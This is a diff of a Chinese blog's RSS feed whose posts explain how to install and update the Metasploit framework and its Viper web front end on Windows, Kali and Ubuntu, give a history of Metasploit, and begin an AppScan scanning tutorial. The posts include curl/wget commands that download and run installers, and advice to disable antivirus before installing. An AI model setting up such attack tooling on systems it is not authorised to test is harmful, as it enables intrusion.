+&lt;p&gt;curl -L &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9nZXQuZGFvY2xvdWQuaW8vZG9ja2VyL2NvbXBvc2UvcmVsZWFzZXMvZG93bmxvYWQvMS4yNS41L2RvY2tlci1jb21wb3NlLQ==&#34;&gt;https://get.daocloud.io/docker/compose/releases/download/1.25.5/docker-compose-&lt;/span&gt; &lt;code&gt;uname -s&lt;/code&gt; - &lt;code&gt;uname -m&lt;/code&gt;  &amp;gt; /usr/bin/docker-compose&lt;/p&gt;
+&lt;p&gt;#给赋可执行状态 chmod +x /usr/bin/docker-compose&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043297604.png&#34; alt=&#34;1640043297604&#34;&gt;&lt;/p&gt;
+&lt;p&gt;#设置安装目录&lt;/p&gt;
+&lt;p&gt;export VIPER_DIR=/root/VIPER&lt;/p&gt;
+&lt;p&gt;#执行如下命名生成安装目录，并进入安装目录&lt;/p&gt;
+&lt;p&gt;mkdir -p $VIPER_DIR &amp;amp;&amp;amp; cd $VIPER_DIR&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043341743.png&#34; alt=&#34;1640043341743&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;执行如下命令生成 docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;如果你看到的命令是乱的  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ub3RlLnlvdWRhby5jb20vcy9HZHpTSm5XRA==&#34;&gt;https://note.youdao.com/s/GdzSJnWD&lt;/span&gt;  看这个文档&lt;/p&gt;
+&lt;p&gt;tee docker-compose.yml &amp;lt;&amp;lt;-&#39;EOF&#39; version: &amp;quot;3&amp;quot; services:  viper:    image: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3JlZ2lzdHJ5LmNuLXNoZW56aGVuLmFsaXl1bmNzLmNvbS90b3lzL3ZpcGVyOmxhdGVzdA==&#34;&gt;registry.cn-shenzhen.aliyuncs.com/toys/viper:latest&lt;/span&gt;    container_name: viper-c    network_mode: &amp;quot;host&amp;quot;    restart: always    volumes:      - ${PWD}/loot:/root/.msf4/loot      - ${PWD}/db:/root/viper/Docker/db      - ${PWD}/module:/root/viper/Docker/module      - ${PWD}/log:/root/viper/Docker/log      - ${PWD}/nginxconfig:/root/viper/Docker/nginxconfig    command: [&amp;quot;VIPER_PASSWORD&amp;quot;] EOF&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043385926.png&#34; alt=&#34;1640043385926&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;设置登录密码&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Viper 不允许使用默认密码，diypassword 替换为自定义密码密码&lt;/p&gt;
+&lt;p&gt;export VIPER_PASSWORD = 输入你的密码&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043439186.png&#34; alt=&#34;1640043439186&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;写入密码到 docker-compose.yml&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;sed -i &amp;quot;s/VIPER_PASSWORD/$VIPER_PASSWORD/g&amp;quot; docker-compose.yml&lt;/p&gt;
+&lt;p&gt;#使用命令查看一下配置&lt;/p&gt;
+&lt;p&gt;cat docker-compose.yml&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043478861.png&#34; alt=&#34;1640043478861&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;创建启动 Viper&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;cd $VIPER_DIR docker-compose up -d&lt;/p&gt;
+&lt;p&gt;启动 viper&lt;/p&gt;
+&lt;p&gt;docker-compose start&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043509764.png&#34; alt=&#34;1640043509764&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;等待 15s 系统启动，访问&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9pcDo2MDAwMA==&#34;&gt;https://ip:60000&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;登录。用户名:root 密码：自定义密码&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;在终端内输入  ip a 查看本机 ip&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;我的 IP 是 192.168.3.31  那么我在浏览器里就访问  &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMuMzE6NjAwMDA=&#34;&gt;https://192.168.3.31:60000&lt;/span&gt;  登录名是  root  密码是  我上面设置的 root&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img data-src=&#34;MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043540568.png&#34; alt=&#34;1640043540568&#34;&gt;&lt;/p&gt;
+&lt;p&gt;例如： 我的 ip 是 192.168.3.31  那么访问炫彩蛇的 IP 就是 192.168.3.31:60000&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;所有的 docker-compose 命令必须在安装目录执行才会有效果&lt;/strong&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/WINDOWS%E5%AE%89%E8%A3%85MSF/</guid>
+            <title>WINDOWS安装MSF</title>
+            <link>https://mangpumo.github.io/2023/01/12/WINDOWS%E5%AE%89%E8%A3%85MSF/</link>
+            <pubDate>Thu, 12 Jan 2023 02:35:20 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;1-下载metasploit&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-下载metasploit&#34;&gt;#&lt;/a&gt; 1  下载 metasploit&lt;/h1&gt;
+&lt;p&gt;首先咱们进入 metasploit 官网&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWV0YXNwbG9pdC5jb20v&#34;&gt;https://www.metasploit.com/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/de0dfa24cf144e319e9817208d796e67.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;点击 Download  下载&lt;/p&gt;
+&lt;p&gt;或者直接访问这个 地址&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cubWV0YXNwbG9pdC5jb20vZG93bmxvYWQ=&#34;&gt;https://www.metasploit.com/download&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;进入这个页面  点击 Metasploit Framework  下面的 Download&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/40c70142eedd4ee7b6a132a84426dd1f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;会访问这个地址&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LWZyYW1ld29yay93aWtpL05pZ2h0bHktSW5zdGFsbGVycw==&#34;&gt;https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;如果你不能打开 GitHub 我们可以通过镜像服务器 访问&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odWIuZmFzdGdpdC5vcmcvcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrL3dpa2kvTmlnaHRseS1JbnN0YWxsZXJz&#34;&gt;https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/a6096a53fc0f411fa7d4a1ecb32bea1a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这边给大家提供更多的国内可用镜像&lt;/p&gt;
+&lt;p&gt;#官网镜像（可以用来 clone push 等，但是不能登录）&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tLmNucG1qcy5vcmcv&#34;&gt;https://github.com.cnpmjs.org/&lt;/span&gt;&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXQuc2R1dC5tZS8=&#34;&gt;https://git.sdut.me/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;#github 常用的镜像&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9odWIuZmFzdGdpdC5vcmc=&#34;&gt;https://hub.fastgit.org&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXQuc2R1dC5tZS8=&#34;&gt;https://git.sdut.me/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2dpdGh1Yi1taXJyb3IuYnVna2lsbGVyLm9yZy8=&#34;&gt;http://github-mirror.bugkiller.org/&lt;/span&gt;&lt;br&gt;
+#api 镜像&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcGkuZ2l0LnNkdXQubWUv&#34;&gt; https://api.git.sdut.me/&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;然后找到 Windows 版本的下载&lt;/p&gt;
+&lt;p&gt;点击 latest Windows installer 下载  最新版本&lt;/p&gt;
+&lt;p&gt;点击  view older builds   下载历史版本&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/cd3b851b93854b55b549028fa9fb61f9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;2-安装metasploit并配置环境变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-安装metasploit并配置环境变量&#34;&gt;#&lt;/a&gt; 2 安装 metasploit 并配置环境变量&lt;/h1&gt;
+&lt;p&gt;安装前关闭 win 自带的杀毒 和卸载第三方杀毒&lt;/p&gt;
+&lt;p&gt;添加环境变量&lt;/p&gt;
+&lt;p&gt;C:\metasploit-framework\bin&lt;/p&gt;
+&lt;h1 id=&#34;3-启动并使用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-启动并使用&#34;&gt;#&lt;/a&gt; 3 启动并使用&lt;/h1&gt;
+&lt;p&gt;首次启动 需要初始化数据库&lt;/p&gt;
+&lt;p&gt;终端中输入 msfdb init&lt;/p&gt;
+&lt;p&gt;启动 MSF 框架&lt;/p&gt;
+&lt;p&gt;终端中输入 msfconsole&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/KALI%E6%9B%B4%E6%96%B0MSF/</guid>
+            <title>KALI更新MSF</title>
+            <link>https://mangpumo.github.io/2023/01/12/KALI%E6%9B%B4%E6%96%B0MSF/</link>
+            <pubDate>Thu, 12 Jan 2023 02:30:56 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;登录 kali&lt;/p&gt;
+&lt;h1 id=&#34;1-打开终端获取root权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-打开终端获取root权限&#34;&gt;#&lt;/a&gt; 1 打开终端获取 root 权限&lt;/h1&gt;
+&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;获取root权限 可以在终端 输入 sudo su  然后输入登录密码获取root权限&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;h1 id=&#34;2-开始更新&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-开始更新&#34;&gt;#&lt;/a&gt; 2 开始更新&lt;/h1&gt;
+&lt;p&gt;首先先添加更新源&lt;/p&gt;
+&lt;p&gt;进入 etc/apt/   目录&lt;/p&gt;
+&lt;p&gt;打开 sources.list   需要使用 root 权限执行&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/777269e6dc9143718ac9080d4650d0c7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;deb &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMudXN0Yy5lZHUuY24va2FsaQ==&#34;&gt;http://mirrors.ustc.edu.cn/kali&lt;/span&gt; kali-rolling main non-free contrib&lt;/p&gt;
+&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMudXN0Yy5lZHUuY24va2FsaQ==&#34;&gt;http://mirrors.ustc.edu.cn/kali&lt;/span&gt; kali-rolling main non-free contrib&lt;/p&gt;
+&lt;p&gt;#阿里云 kali 更新源&lt;/p&gt;
+&lt;p&gt;deb &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9rYWxp&#34;&gt;http://mirrors.aliyun.com/kali&lt;/span&gt; kali-rolling main non-free contrib&lt;/p&gt;
+&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuYWxpeXVuLmNvbS9rYWxp&#34;&gt;http://mirrors.aliyun.com/kali&lt;/span&gt; kali-rolling main non-free contrib&lt;/p&gt;
+&lt;p&gt;#163 DEBIAN 源&lt;/p&gt;
+&lt;p&gt;deb &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=&#34;&gt;http://mirrors.163.com/debian&lt;/span&gt; wheezy main non-free contrib&lt;/p&gt;
+&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=&#34;&gt;http://mirrors.163.com/debian&lt;/span&gt; wheezy main non-free contrib deb &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=&#34;&gt;http://mirrors.163.com/debian&lt;/span&gt; wheezy-proposed-updates main non-free contrib&lt;/p&gt;
+&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4=&#34;&gt;http://mirrors.163.com/debian&lt;/span&gt; wheezy-proposed-updates main non-free contrib&lt;/p&gt;
+&lt;p&gt;deb-src &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL21pcnJvcnMuMTYzLmNvbS9kZWJpYW4tc2VjdXJpdHk=&#34;&gt;http://mirrors.163.com/debian-security&lt;/span&gt; wheezy/updates main non-free contrib&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/c9eeca42087541a09f20a8078d8064c7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;​                apt-get update&lt;/p&gt;
+&lt;p&gt;​                apt-get  install metasploit-framework&lt;/p&gt;
+&lt;h1 id=&#34;3-如果更新时显示update无效的错误&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-如果更新时显示update无效的错误&#34;&gt;#&lt;/a&gt; 3 如果更新时显示 update 无效的错误！&lt;/h1&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/dea81b359ad14271b35fbc7db0609126.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;输入下面几个命令修复&lt;/p&gt;
+&lt;p&gt;wget -q -O - &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcmNoaXZlLmthbGkub3JnL2FyY2hpdmUta2V5LmFzYw==&#34;&gt;https://archive.kali.org/archive-key.asc&lt;/span&gt; | apt-key add&lt;/p&gt;
+&lt;p&gt;apt-get clean&lt;/p&gt;
+&lt;p&gt;apt-get update&lt;/p&gt;
+&lt;p&gt;4 如果报：E: Unmet dependencies. Try &#39;apt --fix-broken install&#39; with no packages (or specify a solution).&lt;/p&gt;
+&lt;p&gt;​                apt --fix-broken install&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/Linux%E5%AE%89%E8%A3%85MSF/</guid>
+            <title>Linux安装MSF</title>
+            <link>https://mangpumo.github.io/2023/01/12/Linux%E5%AE%89%E8%A3%85MSF/</link>
+            <pubDate>Thu, 12 Jan 2023 02:29:36 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;&lt;strong&gt;1 乌班图安装 MSF&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;环境准备：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;vm 虚拟机&lt;/p&gt;
+&lt;p&gt;Ubuntu 桌面版镜像&lt;/p&gt;
+&lt;p&gt;打开终端  输入 sudo su  获取 root 权限&lt;/p&gt;
+&lt;p&gt;然后输入命令&lt;/p&gt;
+&lt;p&gt;curl &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3JhcGlkNy9tZXRhc3Bsb2l0LW9tbmlidXMvbWFzdGVyL2NvbmZpZy90ZW1wbGF0ZXMvbWV0YXNwbG9pdC1mcmFtZXdvcmstd3JhcHBlcnMvbXNmdXBkYXRlLmVyYg==&#34;&gt;https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb&lt;/span&gt; &amp;gt; msfinstall&lt;/p&gt;
+&lt;p&gt;然后赋 755 权限 并执行安装&lt;/p&gt;
+&lt;p&gt;chmod 755 msfinstall &amp;amp;&amp;amp; ./msfinstall&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;2 直接安装 kali 系统&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;第一种 vm 虚拟机 kali&lt;/p&gt;
+&lt;p&gt;第二种 iso 安装镜像&lt;/p&gt;
+&lt;p&gt;首先咱们进入 kali 官网下载 kali&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cua2FsaS5vcmcvZ2V0LWthbGkvI2thbGktYmFyZS1tZXRhbA==&#34;&gt;https://www.kali.org/get-kali/#kali-bare-metal&lt;/span&gt;  选择安装版镜像&lt;/p&gt;
+&lt;p&gt;![1639993881805](02 Linux 安装 msf.assets/1639993881805.png)&lt;/p&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/MSF%E5%8F%91%E5%B1%95%E5%8F%B2/</guid>
+            <title>MSF发展史</title>
+            <link>https://mangpumo.github.io/2023/01/12/MSF%E5%8F%91%E5%B1%95%E5%8F%B2/</link>
+            <pubDate>Thu, 12 Jan 2023 02:28:13 +0800</pubDate>
+            <description><![CDATA[ &lt;h1 id=&#34;1-metasploit-发展史&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1-metasploit-发展史&#34;&gt;#&lt;/a&gt; 1 Metasploit - 发展史&lt;/h1&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/418450a2cc3143c2bb296f73eccb131d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Metasploit 框架使 Metasploit 具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit 框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前 BO2K 等工具所具备的功能。&lt;/p&gt;
+&lt;h2 id=&#34;2004年&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2004年&#34;&gt;#&lt;/a&gt; 2004 年&lt;/h2&gt;
+&lt;p&gt;2004 年 8 月，在拉斯维加斯开了一次世界黑客交流会 -- 叫黑帽简报（Black Hat Briefings). 在这个会议上，一款叫 Metasploit 的攻击和渗透工具备受众黑客关注，出尽了风头。 Metasploit 是同 HD Moore 和 Spoonm 等 4 名年轻人开发的，这款免费软件可以帮助黑客攻击和控制计算机，安全人员也可以利用 Metasploit 来加强系统对此类工具的攻击。Metasploit 的演示吸引了来自 “美国国防部” 和 “国家安全局” 等政府机构的众多安全顾问和个人，正如 Spoonm 在演讲中所说的，Metasploit 很简单，只需要求 “找到目标，单击和控制” 即可。 2004 年 Metasploit 的发布在安全界引发了强烈的 “地震”。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/a3d942aff8ef42949af2523afdc7fb00.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;2005年&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2005年&#34;&gt;#&lt;/a&gt; 2005 年&lt;/h2&gt;
+&lt;p&gt;2005 年 6 月，西雅图效区的微软公司总部园区内的管理情报中心，开了一次 “蓝帽” 会议。几百名微软公司的工程师和众多外界专家及黑客都被邀请进入微软帝国的中心。在会议中的黑客攻击演示中，当 Moore 向系统程序员们说明使用 Metasploit 测试系统对抗入侵的可靠程度时，Metasploit 让微软公司的开发人员再次感到不安。在程序员们看来，Metasploit 将会使系统安全面临严重的考验。 Metasploit (MSF) 在 2003 年以开放源码方式发布，是可以自由获取的开发框架。它是一个强大的开源平台，提供开发，测试和使用恶意代码，这个环境为渗透测试，为 shellcode 编写和漏洞研究提供了一个可靠平台。 Metasploit 框架直到 2006 年发布的 2.7 版本都用 Perl 脚本语言编写，由于 Perl 的一些缺陷，开发者于 2007 年底使用 Ruby 语言重写了该框架。到 2007 年年底，Spoonm 和马特・米勒已经离开了项目。从 2008 年发布的 3.2 版本开始，该项目采用新的 3 段式 BSD 许可证。&lt;/p&gt;
+&lt;h2 id=&#34;2009年&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2009年&#34;&gt;#&lt;/a&gt; 2009 年&lt;/h2&gt;
+&lt;p&gt;2009 年 10 月 21 号，漏洞管理解决公司 Rapid7 收购 Metasploit 项目。Rapid7 承诺成立专职开发团队，仍然将源代码置于 3 段式 BSD 许可证下。&lt;/p&gt;
+&lt;h1 id=&#34;2-bsd许可证&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2-bsd许可证&#34;&gt;#&lt;/a&gt; 2 BSD 许可证&lt;/h1&gt;
+&lt;p&gt;相较于 GPL 许可证和 MPL 许可证的严格性，BSD 许可证就宽松许多了，一样是只需要附上许可证的原文，不过比较有趣的是，它还要求所有进一步开发者将自己的版权资料放上去，所以拿到以 BSD 许可证发行的软件可能会遇到一个小状况，就是这些版权资料许可证占的空间比程序还大。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/9bc54e5da27644769e8c59836a95aa0c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h1 id=&#34;3-metasploit发展前景&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3-metasploit发展前景&#34;&gt;#&lt;/a&gt; 3 Metasploit 发展前景&lt;/h1&gt;
+&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/53ecab99591140878359777a3039a423.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
         <item>
             <guid isPermalink="true">https://mangpumo.github.io/2023/01/12/CPP%E5%B9%B6%E6%9F%A5%E9%9B%86/</guid>
             <title>CPP并查集</title>
@@ -605,793 +1201,6 @@
 &lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4812c10f2bd445d6ac3d63e3caae12f8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
 &lt;p&gt;3. 基于模板报告&lt;/p&gt;
 &lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/d7bbb31bea304c5086c93f66a8e4bbda.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/AppScan%E8%87%AA%E5%AE%9A%E4%B9%89%E6%89%AB%E6%8F%8F%E7%AD%96%E7%95%A5%EF%BC%8C%E6%89%AB%E6%8F%8F%E9%92%88%E5%AF%B9%E6%80%A7%E6%BC%8F%E6%B4%9E/</guid>
-            <title>AppScan自定义扫描策略，扫描针对性漏洞</title>
-            <link>https://mangpumo.github.io/2023/01/11/AppScan%E8%87%AA%E5%AE%9A%E4%B9%89%E6%89%AB%E6%8F%8F%E7%AD%96%E7%95%A5%EF%BC%8C%E6%89%AB%E6%8F%8F%E9%92%88%E5%AF%B9%E6%80%A7%E6%BC%8F%E6%B4%9E/</link>
-            <pubDate>Wed, 11 Jan 2023 05:35:00 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;appscan自定义扫描策略扫描针对性漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appscan自定义扫描策略扫描针对性漏洞&#34;&gt;#&lt;/a&gt; AppScan 自定义扫描策略，扫描针对性漏洞&lt;/h1&gt;
-&lt;p&gt;安全扫描往往速度是很慢的，有些场景下他的扫描项目又不是我们需要的，这时候就需要定制专属的扫描策略了。本节课以 sql 注入漏洞为例&lt;/p&gt;
-&lt;p&gt;1. 选择【扫描 web 应用程序】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/2e5a3c50f05f46879fac8a82573bd283.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 点击【取消】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c18d316f818b4febb9be9624370583c3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;3. 点击【配置】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/8b3ac7c8fb804ecabcd04b20606236f1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 输入被目标网站 url&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6acf7962b56b40cdae8e59cbdfd2b83d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 选择【参数和 cookie】，选择【定制头】，点击【+】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/0025b2e972fb46f594c42f356e17cadb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;4. 切换火狐浏览器，复制网站 cookie&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/ed966b809eb140b4842fd846b623c2cb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 切换到 AppScan，填写定制头，点击【确定】&lt;/p&gt;
